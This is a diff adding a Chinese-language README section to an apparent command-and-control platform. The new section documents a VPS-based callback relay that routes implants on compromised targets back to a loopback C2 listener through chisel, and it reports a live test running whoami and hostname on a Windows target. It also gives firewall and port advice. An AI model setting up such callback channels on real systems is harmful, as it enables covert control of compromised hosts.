@@ -114,6 +114,22 @@ tunnel_deploy(kind="socks", c2_session_id=<C2 会话 id>, listen_port=39443)
 
 公网实测：VPS 仅 C2 TCP 上线，无 SSH；C2 任务上传并拉起 chisel，平台 SOCKS 访问 VPS 本地 HTTP 返回 200。
 
+### C2 入站回调中继（v0.4.7，目标只回连 VPS）
+
+当目标被拿下后必须回连 VPS、不能回连平台地址时：
+
+```text
+c2_ingress_deploy(session_id=<VPS 会话>, vps_host=<VPS 公网 IP>, vps_port=443)
+```
+
+- 平台 C2 listener 只绑 127.0.0.1；VPS 侧 chisel client 本地转发监听 vps_port，目标植入端只填 VPS 地址。
+- 工具自动创建/启动 loopback C2 listener，返回回调地址和植入端（HTTP PowerShell/Python/Bash 或 TCP Python）。
+- 公网 VPS 需要在云防火墙/安全组放行 vps_port；若云厂商只允许 80/443，可用 443/80 或在前置 openresty/nginx 上做 TCP/HTTP 代理。
+- 停止用 c2_ingress_teardown(tunnel_id=...)；会停隧道并停止关联 listener。
+
+真机实测：Windows 133 目标经 VPS ingress 回连平台 loopback C2，任务 whoami/hostname 成功（20.6s）。
+
+
 
 ## 安装
 
